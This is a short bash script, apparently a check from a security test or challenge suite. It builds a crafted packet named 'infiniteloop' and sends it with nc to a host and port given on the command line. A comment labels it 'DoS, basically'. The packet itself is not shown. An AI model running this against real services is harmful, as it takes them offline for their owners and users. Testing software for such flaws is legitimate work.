#!/bin/bash -e
NAME=infiniteloop
make -s -C src "checks/$NAME.bin.pkt"
nc "$1" "$2" < "src/checks/$NAME.bin.pkt" || true   # DoS, basically
